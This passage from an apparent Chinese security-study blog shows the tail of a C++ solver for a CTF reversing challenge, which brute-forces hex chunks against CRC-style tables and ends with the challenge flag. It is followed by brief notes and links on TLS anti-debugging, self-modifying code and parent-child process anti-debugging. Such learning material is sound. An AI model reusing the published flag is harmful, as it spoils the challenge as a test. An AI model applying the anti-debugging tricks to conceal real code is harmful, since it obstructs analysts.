<span class="number">0xA344316A</span>, <span class="number">0x250DCDC7</span>, <span class="number">0xCA3DA6DE</span>, <span class="number">0xFE816D04</span>, <span class="number">0x11B1061D</span>,</span><br><span class="line"><span class="number">0xF7FEE2AF</span>, <span class="number">0x18CE89B6</span>, <span class="number">0x2C72426C</span>, <span class="number">0xC3422975</span>, <span class="number">0x450BD5D8</span>, <span class="number">0xAA3BBEC1</span>, <span class="number">0x9E87751B</span>, <span class="number">0x71B71E02</span>,</span><br><span class="line"><span class="number">0x57F4CA8E</span>, <span class="number">0xB8C4A197</span>, <span class="number">0x8C786A4D</span>, <span class="number">0x63480154</span>, <span class="number">0xE501FDF9</span>, <span class="number">0x0A3196E0</span>, <span class="number">0x3E8D5D3A</span>, <span class="number">0xD1BD3623</span>,</span><br><span class="line"><span class="number">0x37F2D291</span>, <span class="number">0xD8C2B988</span>, <span class="number">0xEC7E7252</span>, <span class="number">0x034E194B</span>, <span class="number">0x8507E5E6</span>, <span class="number">0x6A378EFF</span>, <span class="number">0x5E8B4525</span>, <span class="number">0xB1BB2E3C</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x68032CC8</span>, <span class="number">0xD0065990</span>, <span class="number">0xB8057558</span>, <span class="number">0xA5E0C5D1</span>, <span class="number">0xCDE3E919</span>, <span class="number">0x75E69C41</span>, <span class="number">0x1DE5B089</span>,</span><br><span class="line"><span class="number">0x4E2DFD53</span>, <span class="number">0x262ED19B</span>, <span class="number">0x9E2BA4C3</span>, <span class="number">0xF628880B</span>, <span class="number">0xEBCD3882</span>, <span class="number">0x83CE144A</span>, <span class="number">0x3BCB6112</span>, <span class="number">0x53C84DDA</span>,</span><br><span class="line"><span class="number">0x9C5BFAA6</span>, <span class="number">0xF458D66E</span>, <span class="number">0x4C5DA336</span>, <span class="number">0x245E8FFE</span>, <span class="number">0x39BB3F77</span>, <span class="number">0x51B813BF</span>, <span class="number">0xE9BD66E7</span>, <span class="number">0x81BE4A2F</span>,</span><br><span class="line"><span class="number">0xD27607F5</span>, <span class="number">0xBA752B3D</span>, <span class="number">0x02705E65</span>, <span class="number">0x6A7372AD</span>, <span class="number">0x7796C224</span>, <span class="number">0x1F95EEEC</span>, <span class="number">0xA7909BB4</span>, <span class="number">0xCF93B77C</span>,</span><br><span class="line"><span class="number">0x3D5B83BD</span>, <span class="number">0x5558AF75</span>, <span class="number">0xED5DDA2D</span>, <span class="number">0x855EF6E5</span>, <span class="number">0x98BB466C</span>, <span class="number">0xF0B86AA4</span>, <span class="number">0x48BD1FFC</span>, <span class="number">0x20BE3334</span>,</span><br><span class="line"><span class="number">0x73767EEE</span>, <span class="number">0x1B755226</span>, <span class="number">0xA370277E</span>, <span class="number">0xCB730BB6</span>, <span class="number">0xD696BB3F</span>, <span class="number">0xBE9597F7</span>, <span class="number">0x0690E2AF</span>, <span class="number">0x6E93CE67</span>,</span><br><span class="line"><span class="number">0xA100791B</span>, <span class="number">0xC90355D3</span>, <span class="number">0x7106208B</span>, <span class="number">0x19050C43</span>, <span class="number">0x04E0BCCA</span>, <span class="number">0x6CE39002</span>, <span class="number">0xD4E6E55A</span>, <span class="number">0xBCE5C992</span>,</span><br><span class="line"><span class="number">0xEF2D8448</span>, <span class="number">0x872EA880</span>, <span class="number">0x3F2BDDD8</span>, <span class="number">0x5728F110</span>, <span class="number">0x4ACD4199</span>, <span class="number">0x22CE6D51</span>, <span class="number">0x9ACB1809</span>, <span class="number">0xF2C834C1</span>,</span><br><span class="line"><span class="number">0x7AB7077A</span>, <span class="number">0x12B42BB2</span>, <span class="number">0xAAB15EEA</span>, <span class="number">0xC2B27222</span>, <span class="number">0xDF57C2AB</span>, <span class="number">0xB754EE63</span>, <span class="number">0x0F519B3B</span>, <span class="number">0x6752B7F3</span>,</span><br><span class="line"><span class="number">0x349AFA29</span>, <span class="number">0x5C99D6E1</span>, <span class="number">0xE49CA3B9</span>, <span class="number">0x8C9F8F71</span>, <span class="number">0x917A3FF8</span>, <span class="number">0xF9791330</span>, <span class="number">0x417C6668</span>, <span class="number">0x297F4AA0</span>,</span><br><span class="line"><span class="number">0xE6ECFDDC</span>, <span class="number">0x8EEFD114</span>, <span class="number">0x36EAA44C</span>, <span class="number">0x5EE98884</span>, <span class="number">0x430C380D</span>, <span class="number">0x2B0F14C5</span>, <span class="number">0x930A619D</span>, <span class="number">0xFB094D55</span>,</span><br><span class="line"><span class="number">0xA8C1008F</span>, <span class="number">0xC0C22C47</span>, <span class="number">0x78C7591F</span>, <span class="number">0x10C475D7</span>, <span class="number">0x0D21C55E</span>, <span class="number">0x6522E996</span>, <span class="number">0xDD279CCE</span>, <span class="number">0xB524B006</span>,</span><br><span class="line"><span class="number">0x47EC84C7</span>, <span class="number">0x2FEFA80F</span>, <span class="number">0x97EADD57</span>, <span class="number">0xFFE9F19F</span>, <span class="number">0xE20C4116</span>, <span class="number">0x8A0F6DDE</span>, <span class="number">0x320A1886</span>, <span class="number">0x5A09344E</span>,</span><br><span class="line"><span class="number">0x09C17994</span>, <span class="number">0x61C2555C</span>, <span class="number">0xD9C72004</span>, <span class="number">0xB1C40CCC</span>, <span class="number">0xAC21BC45</span>, <span class="number">0xC422908D</span>, <span class="number">0x7C27E5D5</span>, <span class="number">0x1424C91D</span>,</span><br><span class="line"><span class="number">0xDBB77E61</span>, <span class="number">0xB3B452A9</span>, <span class="number">0x0BB127F1</span>, <span class="number">0x63B20B39</span>, <span class="number">0x7E57BBB0</span>, <span class="number">0x16549778</span>, <span class="number">0xAE51E220</span>, <span class="number">0xC652CEE8</span>,</span><br><span class="line"><span class="number">0x959A8332</span>, <span class="number">0xFD99AFFA</span>, <span class="number">0x459CDAA2</span>, <span class="number">0x2D9FF66A</span>, <span class="number">0x307A46E3</span>, <span class="number">0x58796A2B</span>, <span class="number">0xE07C1F73</span>, <span class="number">0x887F33BB</span>,</span><br><span class="line"><span class="number">0xF56E0EF4</span>, <span class="number">0x9D6D223C</span>, <span class="number">0x25685764</span>, <span class="number">0x4D6B7BAC</span>, <span class="number">0x508ECB25</span>, <span class="number">0x388DE7ED</span>, <span class="number">0x808892B5</span>, <span class="number">0xE88BBE7D</span>,</span><br><span class="line"><span class="number">0xBB43F3A7</span>, <span class="number">0xD340DF6F</span>, <span class="number">0x6B45AA37</span>, <span class="number">0x034686FF</span>, <span class="number">0x1EA33676</span>, <span class="number">0x76A01ABE</span>, <span class="number">0xCEA56FE6</span>, <span class="number">0xA6A6432E</span>,</span><br><span class="line"><span class="number">0x6935F452</span>, <span class="number">0x0136D89A</span>, <span class="number">0xB933ADC2</span>, <span class="number">0xD130810A</span>, <span class="number">0xCCD53183</span>, <span class="number">0xA4D61D4B</span>, <span class="number">0x1CD36813</span>, <span class="number">0x74D044DB</span>,</span><br><span class="line"><span class="number">0x27180901</span>, <span class="number">0x4F1B25C9</span>, <span class="number">0xF71E5091</span>, <span class="number">0x9F1D7C59</span>, <span class="number">0x82F8CCD0</span>, <span class="number">0xEAFBE018</span>, <span class="number">0x52FE9540</span>, <span class="number">0x3AFDB988</span>,</span><br><span class="line"><span class="number">0xC8358D49</span>, <span class="number">0xA036A181</span>, <span class="number">0x1833D4D9</span>, <span class="number">0x7030F811</span>, <span class="number">0x6DD54898</span>, <span class="number">0x05D66450</span>, <span class="number">0xBDD31108</span>, <span class="number">0xD5D03DC0</span>,</span><br><span class="line"><span class="number">0x8618701A</span>, <span class="number">0xEE1B5CD2</span>, <span class="number">0x561E298A</span>, <span class="number">0x3E1D0542</span>, <span class="number">0x23F8B5CB</span>, <span class="number">0x4BFB9903</span>, <span class="number">0xF3FEEC5B</span>, <span class="number">0x9BFDC093</span>,</span><br><span class="line"><span class="number">0x546E77EF</span>, <span class="number">0x3C6D5B27</span>, <span class="number">0x84682E7F</span>, <span class="number">0xEC6B02B7</span>, <span class="number">0xF18EB23E</span>, <span class="number">0x998D9EF6</span>, <span class="number">0x2188EBAE</span>, <span class="number">0x498BC766</span>,</span><br><span class="line"><span class="number">0x1A438ABC</span>, <span class="number">0x7240A674</span>, <span class="number">0xCA45D32C</span>, <span class="number">0xA246FFE4</span>, <span class="number">0xBFA34F6D</span>, <span class="number">0xD7A063A5</span>, <span class="number">0x6FA516FD</span>, <span class="number">0x07A63A35</span>,</span><br><span class="line"><span class="number">0x8FD9098E</span>, <span class="number">0xE7DA2546</span>, <span class="number">0x5FDF501E</span>, <span class="number">0x37DC7CD6</span>, <span class="number">0x2A39CC5F</span>, <span class="number">0x423AE097</span>, <span class="number">0xFA3F95CF</span>, <span class="number">0x923CB907</span>,</span><br><span class="line"><span class="number">0xC1F4F4DD</span>, <span class="number">0xA9F7D815</span>, <span class="number">0x11F2AD4D</span>, <span class="number">0x79F18185</span>, <span class="number">0x6414310C</span>, <span class="number">0x0C171DC4</span>, <span class="number">0xB412689C</span>, <span class="number">0xDC114454</span>,</span><br><span class="line"><span class="number">0x1382F328</span>, <span class="number">0x7B81DFE0</span>, <span class="number">0xC384AAB8</span>, <span class="number">0xAB878670</span>, <span class="number">0xB66236F9</span>, <span class="number">0xDE611A31</span>, <span class="number">0x66646F69</span>, <span class="number">0x0E6743A1</span>,</span><br><span class="line"><span class="number">0x5DAF0E7B</span>, <span class="number">0x35AC22B3</span>, <span class="number">0x8DA957EB</span>, <span class="number">0xE5AA7B23</span>, <span class="number">0xF84FCBAA</span>, <span class="number">0x904CE762</span>, <span class="number">0x2849923A</span>, <span class="number">0x404ABEF2</span>,</span><br><span class="line"><span class="number">0xB2828A33</span>, <span class="number">0xDA81A6FB</span>, <span class="number">0x6284D3A3</span>, <span class="number">0x0A87FF6B</span>, <span class="number">0x17624FE2</span>, <span class="number">0x7F61632A</span>, <span class="number">0xC7641672</span>, <span class="number">0xAF673ABA</span>,</span><br><span class="line"><span class="number">0xFCAF7760</span>, <span class="number">0x94AC5BA8</span>, <span class="number">0x2CA92EF0</span>, <span class="number">0x44AA0238</span>, <span class="number">0x594FB2B1</span>, <span class="number">0x314C9E79</span>, <span class="number">0x8949EB21</span>, <span class="number">0xE14AC7E9</span>,</span><br><span class="line"><span class="number">0x2ED97095</span>, <span class="number">0x46DA5C5D</span>, <span class="number">0xFEDF2905</span>, <span class="number">0x96DC05CD</span>, <span class="number">0x8B39B544</span>, <span class="number">0xE33A998C</span>, <span class="number">0x5B3FECD4</span>, <span class="number">0x333CC01C</span>,</span><br><span class="line"><span class="number">0x60F48DC6</span>, <span class="number">0x08F7A10E</span>, <span class="number">0xB0F2D456</span>, <span class="number">0xD8F1F89E</span>, <span class="number">0xC5144817</span>, <span class="number">0xAD1764DF</span>, <span class="number">0x15121187</span>, <span class="number">0x7D113D4F</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x493C7D27</span>, <span class="number">0x9278FA4E</span>, <span class="number">0xDB448769</span>, <span class="number">0x211D826D</span>, <span class="number">0x6821FF4A</span>, <span class="number">0xB3657823</span>, <span class="number">0xFA590504</span>,</span><br><span class="line"><span class="number">0x423B04DA</span>, <span class="number">0x0B0779FD</span>, <span class="number">0xD043FE94</span>, <span class="number">0x997F83B3</span>, <span class="number">0x632686B7</span>, <span class="number">0x2A1AFB90</span>, <span class="number">0xF15E7CF9</span>, <span class="number">0xB86201DE</span>,</span><br><span class="line"><span class="number">0x847609B4</span>, <span class="number">0xCD4A7493</span>, <span class="number">0x160EF3FA</span>, <span class="number">0x5F328EDD</span>, <span class="number">0xA56B8BD9</span>, <span class="number">0xEC57F6FE</span>, <span class="number">0x37137197</span>, <span class="number">0x7E2F0CB0</span>,</span><br><span class="line"><span class="number">0xC64D0D6E</span>, <span class="number">0x8F717049</span>, <span class="number">0x5435F720</span>, <span class="number">0x1D098A07</span>, <span class="number">0xE7508F03</span>, <span class="number">0xAE6CF224</span>, <span class="number">0x7528754D</span>, <span class="number">0x3C14086A</span>,</span><br><span class="line"><span class="number">0x0D006599</span>, <span class="number">0x443C18BE</span>, <span class="number">0x9F789FD7</span>, <span class="number">0xD644E2F0</span>, <span class="number">0x2C1DE7F4</span>, <span class="number">0x65219AD3</span>, <span class="number">0xBE651DBA</span>, <span class="number">0xF759609D</span>,</span><br><span class="line"><span class="number">0x4F3B6143</span>, <span class="number">0x06071C64</span>, <span class="number">0xDD439B0D</span>, <span class="number">0x947FE62A</span>, <span class="number">0x6E26E32E</span>, <span class="number">0x271A9E09</span>, <span class="number">0xFC5E1960</span>, <span class="number">0xB5626447</span>,</span><br><span class="line"><span class="number">0x89766C2D</span>, <span class="number">0xC04A110A</span>, <span class="number">0x1B0E9663</span>, <span class="number">0x5232EB44</span>, <span class="number">0xA86BEE40</span>, <span class="number">0xE1579367</span>, <span class="number">0x3A13140E</span>, <span class="number">0x732F6929</span>,</span><br><span class="line"><span class="number">0xCB4D68F7</span>, <span class="number">0x827115D0</span>, <span class="number">0x593592B9</span>, <span class="number">0x1009EF9E</span>, <span class="number">0xEA50EA9A</span>, <span class="number">0xA36C97BD</span>, <span class="number">0x782810D4</span>, <span class="number">0x31146DF3</span>,</span><br><span class="line"><span class="number">0x1A00CB32</span>, <span class="number">0x533CB615</span>, <span class="number">0x8878317C</span>, <span class="number">0xC1444C5B</span>, <span class="number">0x3B1D495F</span>, <span class="number">0x72213478</span>, <span class="number">0xA965B311</span>, <span class="number">0xE059CE36</span>,</span><br><span class="line"><span class="number">0x583BCFE8</span>, <span class="number">0x1107B2CF</span>, <span class="number">0xCA4335A6</span>, <span class="number">0x837F4881</span>, <span class="number">0x79264D85</span>, <span class="number">0x301A30A2</span>, <span class="number">0xEB5EB7CB</span>, <span class="number">0xA262CAEC</span>,</span><br><span class="line"><span class="number">0x9E76C286</span>, <span class="number">0xD74ABFA1</span>, <span class="number">0x0C0E38C8</span>, <span class="number">0x453245EF</span>, <span class="number">0xBF6B40EB</span>, <span class="number">0xF6573DCC</span>, <span class="number">0x2D13BAA5</span>, <span class="number">0x642FC782</span>,</span><br><span class="line"><span class="number">0xDC4DC65C</span>, <span class="number">0x9571BB7B</span>, <span class="number">0x4E353C12</span>, <span class="number">0x07094135</span>, <span class="number">0xFD504431</span>, <span class="number">0xB46C3916</span>, <span class="number">0x6F28BE7F</span>, <span class="number">0x2614C358</span>,</span><br><span class="line"><span class="number">0x1700AEAB</span>, <span class="number">0x5E3CD38C</span>, <span class="number">0x857854E5</span>, <span class="number">0xCC4429C2</span>, <span class="number">0x361D2CC6</span>, <span class="number">0x7F2151E1</span>, <span class="number">0xA465D688</span>, <span class="number">0xED59ABAF</span>,</span><br><span class="line"><span class="number">0x553BAA71</span>, <span class="number">0x1C07D756</span>, <span class="number">0xC743503F</span>, <span class="number">0x8E7F2D18</span>, <span class="number">0x7426281C</span>, <span class="number">0x3D1A553B</span>, <span class="number">0xE65ED252</span>, <span class="number">0xAF62AF75</span>,</span><br><span class="line"><span class="number">0x9376A71F</span>, <span class="number">0xDA4ADA38</span>, <span class="number">0x010E5D51</span>, <span class="number">0x48322076</span>, <span class="number">0xB26B2572</span>, <span class="number">0xFB575855</span>, <span class="number">0x2013DF3C</span>, <span class="number">0x692FA21B</span>,</span><br><span class="line"><span class="number">0xD14DA3C5</span>, <span class="number">0x9871DEE2</span>, <span class="number">0x4335598B</span>, <span class="number">0x0A0924AC</span>, <span class="number">0xF05021A8</span>, <span class="number">0xB96C5C8F</span>, <span class="number">0x6228DBE6</span>, <span class="number">0x2B14A6C1</span>,</span><br><span class="line"><span class="number">0x34019664</span>, <span class="number">0x7D3DEB43</span>, <span class="number">0xA6796C2A</span>, <span class="number">0xEF45110D</span>, <span class="number">0x151C1409</span>, <span class="number">0x5C20692E</span>, <span class="number">0x8764EE47</span>, <span class="number">0xCE589360</span>,</span><br><span class="line"><span class="number">0x763A92BE</span>, <span class="number">0x3F06EF99</span>, <span class="number">0xE44268F0</span>, <span class="number">0xAD7E15D7</span>, <span class="number">0x572710D3</span>, <span class="number">0x1E1B6DF4</span>, <span class="number">0xC55FEA9D</span>, <span class="number">0x8C6397BA</span>,</span><br><span class="line"><span class="number">0xB0779FD0</span>, <span class="number">0xF94BE2F7</span>, <span class="number">0x220F659E</span>, <span class="number">0x6B3318B9</span>, <span class="number">0x916A1DBD</span>, <span class="number">0xD856609A</span>, <span class="number">0x0312E7F3</span>, <span class="number">0x4A2E9AD4</span>,</span><br><span class="line"><span class="number">0xF24C9B0A</span>, <span class="number">0xBB70E62D</span>, <span class="number">0x60346144</span>, <span class="number">0x29081C63</span>, <span class="number">0xD3511967</span>, <span class="number">0x9A6D6440</span>, <span class="number">0x4129E329</span>, <span class="number">0x08159E0E</span>,</span><br><span class="line"><span class="number">0x3901F3FD</span>, <span class="number">0x703D8EDA</span>, <span class="number">0xAB7909B3</span>, <span class="number">0xE2457494</span>, <span class="number">0x181C7190</span>, <span class="number">0x51200CB7</span>, <span class="number">0x8A648BDE</span>, <span class="number">0xC358F6F9</span>,</span><br><span class="line"><span class="number">0x7B3AF727</span>, <span class="number">0x32068A00</span>, <span class="number">0xE9420D69</span>, <span class="number">0xA07E704E</span>, <span class="number">0x5A27754A</span>, <span class="number">0x131B086D</span>, <span class="number">0xC85F8F04</span>, <span class="number">0x8163F223</span>,</span><br><span class="line"><span class="number">0xBD77FA49</span>, <span class="number">0xF44B876E</span>, <span class="number">0x2F0F0007</span>, <span class="number">0x66337D20</span>, <span class="number">0x9C6A7824</span>, <span class="number">0xD5560503</span>, <span class="number">0x0E12826A</span>, <span class="number">0x472EFF4D</span>,</span><br><span class="line"><span class="number">0xFF4CFE93</span>, <span class="number">0xB67083B4</span>, <span class="number">0x6D3404DD</span>, <span class="number">0x240879FA</span>, <span class="number">0xDE517CFE</span>, <span class="number">0x976D01D9</span>, <span class="number">0x4C2986B0</span>, <span class="number">0x0515FB97</span>,</span><br><span class="line"><span class="number">0x2E015D56</span>, <span class="number">0x673D2071</span>, <span class="number">0xBC79A718</span>, <span class="number">0xF545DA3F</span>, <span class="number">0x0F1CDF3B</span>, <span class="number">0x4620A21C</span>, <span class="number">0x9D642575</span>, <span class="number">0xD4585852</span>,</span><br><span class="line"><span class="number">0x6C3A598C</span>, <span class="number">0x250624AB</span>, <span class="number">0xFE42A3C2</span>, <span class="number">0xB77EDEE5</span>, <span class="number">0x4D27DBE1</span>, <span class="number">0x041BA6C6</span>, <span class="number">0xDF5F21AF</span>, <span class="number">0x96635C88</span>,</span><br><span class="line"><span class="number">0xAA7754E2</span>, <span class="number">0xE34B29C5</span>, <span class="number">0x380FAEAC</span>, <span class="number">0x7133D38B</span>, <span class="number">0x8B6AD68F</span>, <span class="number">0xC256ABA8</span>, <span class="number">0x19122CC1</span>, <span class="number">0x502E51E6</span>,</span><br><span class="line"><span class="number">0xE84C5038</span>, <span class="number">0xA1702D1F</span>, <span class="number">0x7A34AA76</span>, <span class="number">0x3308D751</span>, <span class="number">0xC951D255</span>, <span class="number">0x806DAF72</span>, <span class="number">0x5B29281B</span>, <span class="number">0x1215553C</span>,</span><br><span class="line"><span class="number">0x230138CF</span>, <span class="number">0x6A3D45E8</span>, <span class="number">0xB179C281</span>, <span class="number">0xF845BFA6</span>, <span class="number">0x021CBAA2</span>, <span class="number">0x4B20C785</span>, <span class="number">0x906440EC</span>, <span class="number">0xD9583DCB</span>,</span><br><span class="line"><span class="number">0x613A3C15</span>, <span class="number">0x28064132</span>, <span class="number">0xF342C65B</span>, <span class="number">0xBA7EBB7C</span>, <span class="number">0x4027BE78</span>, <span class="number">0x091BC35F</span>, <span class="number">0xD25F4436</span>, <span class="number">0x9B633911</span>,</span><br><span class="line"><span class="number">0xA777317B</span>, <span class="number">0xEE4B4C5C</span>, <span class="number">0x350FCB35</span>, <span class="number">0x7C33B612</span>, <span class="number">0x866AB316</span>, <span class="number">0xCF56CE31</span>, <span class="number">0x14124958</span>, <span class="number">0x5D2E347F</span>,</span><br><span class="line"><span class="number">0xE54C35A1</span>, <span class="number">0xAC704886</span>, <span class="number">0x7734CFEF</span>, <span class="number">0x3E08B2C8</span>, <span class="number">0xC451B7CC</span>, <span class="number">0x8D6DCAEB</span>, <span class="number">0x56294D82</span>, <span class="number">0x1F1530A5</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t2[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0xDC</span>, <span class="number">0x53</span>, <span class="number">0xF5</span>, <span class="number">0x95</span>, <span class="number">0x23</span>, <span class="number">0x4E</span>, <span class="number">0x3B</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0x0B</span>, <span class="number">0x82</span>, <span class="number">0x45</span>, <span class="number">0x9E</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x1B</span>, <span class="number">0x62</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x7F</span>, <span class="number">0x88</span>, <span class="number">0x86</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xA0</span>, <span class="number">0xDE</span>, <span class="number">0x26</span>, <span class="number">0xAA</span>, <span class="number">0x4C</span>, <span class="number">0x04</span>, <span class="number">0x87</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v17; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> m, n, j = <span class="number">0</span>, k = <span class="number">0</span>, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mid;</span><br><span class="line"><span class="type">unsigned</span> sk;</span><br><span class="line">std::string hexChars = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line"><span class="function">std::string <span class="title">input</span><span class="params">(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>)</span></span>;</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">m = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> tt = <span class="number">0</span>; tt &lt; <span class="number">8</span>; tt++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c1 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c2 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c3 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c4 : hexChars) &#123;</span><br><span class="line">input[<span class="number">0</span>] = c1;</span><br><span class="line">input[<span class="number">1</span>] = c2;</span><br><span class="line">input[<span class="number">2</span>] = c3;</span><br><span class="line">input[<span class="number">3</span>] = c4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">sk = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v12 = (sk | ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j)) &amp; ~(sk &amp; ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j));</span><br><span class="line">v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line"><span class="keyword">if</span> (((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; c1 &lt;&lt; c2 &lt;&lt; c3 &lt;&lt; c4;</span><br><span class="line">m += <span class="number">4</span>;</span><br><span class="line">n += <span class="number">256</span>;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">B:;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;b19777392bfa99f1cb695279e8b6851e&#125;</span></span><br></pre></td></tr></table></figure><hr><p>这两周在上课，导致一直在摆烂</p><p>然后主要学了一点TLS的内容和SMC还有父子进程调试还有web的一些入门</p><h2 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h2><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">【原创】反调试实战系列二 TLS反调试+CheckRemoteDebuggerPresent原理 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p>这篇很详细，直接看就好了</p><p>值得注意的是TLS不仅有函数还有全局变量，大致写在下面</p><p><a href="https://www.pri87.vip/posts/95e9e72b.html">TLS相关研究</a></p><h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>其实就是动态地解密代码，动态patch，和hook差不多，但是还是感觉hook方便一点。需要注意尽量不要修改需要重定位的地方，在修改完地址和栈的情况下，地址会错乱，栈指针的偏移量会爆红</p><p>之后我想一个好一点的方法（感觉还是改key或者数组的值好）</p><h2 id="父子进程反调试"><a href="#父子进程反调试" class="headerlink" title="父子进程反调试"></a>父子进程反调试</h2><p><a href="https://www.pri87.vip/posts/3f67770.html">父子进程反调试</a></p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="ida插件编写相关文章"><a href="#ida插件编写相关文章" class="headerlink" title="ida插件编写相关文章"></a>ida插件编写相关文章</h3><p><a href="https://bbs.kanxue.com/thread-38900.htm">IDA Plugin 编写基础-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-226983.htm">原创]用IDAPython实现的反反调试小脚本-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a 